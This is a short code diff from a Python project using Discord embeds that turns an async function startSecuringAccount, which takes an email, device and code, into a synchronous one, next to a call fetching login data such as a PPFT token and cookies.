@@ -9,7 +9,7 @@ from discord import Embed
 import json
 import time
 
-async def startSecuringAccount(email: str, device: str = None, code: str = None):
+def startSecuringAccount(email: str, device: str = None, code: str = None):
     
     data = getLiveData() # {urlPost, ppft, cookies, headers}
 
